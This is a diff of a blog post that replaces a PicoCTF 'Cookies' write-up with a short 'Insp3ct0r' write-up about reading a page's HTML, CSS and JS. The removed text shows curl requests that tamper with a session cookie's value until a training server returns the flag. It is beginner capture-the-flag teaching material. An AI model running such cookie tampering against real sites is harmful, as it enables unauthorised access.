@@ -1,122 +1,25 @@
 ---
-title: PicoCTF - Cookies
+title: PicoCTF - Insp3ct0r
 date: 2023-12-08
 categories: [PicoCTF, Web Exploitation]
-tags: [picoctf, web-exploitation, cookies, http-requests, burp-suit, curl]
-img_path: /assets/picoctf/web_exploitation/cookies
+tags: [picoctf, web-exploitation, inspector, html, css, javascript]
+img_path: /assets/picoctf/web_exploitation/insp3ct0r
 published: true
 ---
 
-![](cookie_banner.png){: width='60%' .normal}
+![](insp3ct0r_banner.png){: width='60%' .normal}
 
-Visiting the link:
+Visiting the site:
 
-![](home.png){: width='60%' }
+![](home.mp4)
 
-Putting `snickerdoodle` as input results to:
+Since the room is called Insp3ct0r, let's use the Inspector tool to inspect the page's HTML code:
 
-![](snickerdoodle_cookie.png)
+![](html_1_3.png)
 
-Intercepting the traffic with Burp and refreshing the page:
+The comment mentions that the flag is split in three parts, and since the creator of the website used three technologies to make the website (HTML, CSS, JS), we can also use the same tool to view the contents of the CSS and JS files:
 
-![](0_snickerdoodle.png)
+![](css_2_3.png)
 
-We have a cookie called `name` set to value `0`. Playing around with different cookie values results to different responses, including the flag:
+![](js_3_3.png)
 
-![](1_choc.png)
-
-![](2_oat.png)
-
-![](18_flag.jpg)
-
-![](28_mac.png)
-
-We can also do the same process using `curl`:
-
-```shell
-# getting the head info
-curl http://mercury.picoctf.net:29649/ -I
-HTTP/1.1 302 FOUND
-Content-Type: text/html; charset=utf-8
-Content-Length: 209
-Location: http://mercury.picoctf.net:29649/
-Set-Cookie: name=-1; Path=/
-```
-
-We can see there there is a cookie called `name` with the value of `-1`. We can set our own value and see what happens:
-
-```shell
-# setting cookie's value to 0
-curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=0;" | grep -i Cookie
-    <title>Cookies</title>
-            <h3 class="text-muted">Cookies</h3>
-          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
-            <p style="text-align:center; font-size:30px;"><b>I love snickerdoodle cookies!</b></p>
-```
-
-```shell
-# setting cookie's value to 1
-curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=1;" | grep -i Cookie
-    <title>Cookies</title>
-            <h3 class="text-muted">Cookies</h3>
-          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
-            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>
-```
-
-```shell
-# setting cookie's value to 18
-curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=18;" | grep -i Cookie
-    <title>Cookies</title>
-            <h3 class="text-muted">Cookies</h3>
-```
-
-We notice that when the cookie to `name=18` it does not return any cookie back! We can inspect the full response:
-
-```shell
-# getting the full response back
-curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=18;"
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <title>Cookies</title>
-
-
-    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
-
-    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
-
-</head>
-
-<body>
-
-    <div class="container">
-        <div class="header">
-            <nav>
-                <ul class="nav nav-pills pull-right">
-                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
-                    </li>
-                </ul>
-            </nav>
-            <h3 class="text-muted">Cookies</h3>
-        </div>
-
-        <div class="jumbotron">
-            <p class="lead"></p>
-            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{<SNIP>}</code></p>
-        </div>
-
-
-        <footer class="footer">
-            <p>&copy; PicoCTF</p>
-        </footer>
-
-    </div>
-</body>
-
-</html>
-```
